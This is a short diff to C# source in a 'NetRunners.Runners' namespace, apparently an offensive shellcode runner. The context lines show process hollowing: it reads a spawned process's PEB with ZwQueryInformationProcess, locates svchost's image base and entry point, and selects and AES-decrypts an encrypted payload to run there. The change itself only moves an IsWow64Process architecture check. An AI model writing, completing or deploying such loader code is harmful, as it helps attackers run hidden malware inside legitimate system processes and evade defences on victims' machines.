@@ -53,8 +53,6 @@ namespace NetRunners.Runners
                 hProcess = pi.hProcess;
                 ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
 
-                IsWow64Process(hProcess, out IsRemote32BitProcess);
-
                 ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
 
                 // fetch address of the code base
@@ -74,6 +72,7 @@ namespace NetRunners.Runners
                 addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
                 // select and decrypt payload
+                IsWow64Process(hProcess, out IsRemote32BitProcess);
                 buf = SelectPayloadArchitecture(IsRemote32BitProcess);
                 buf = DecryptBytesToBytesAes(buf, AesKey);
 
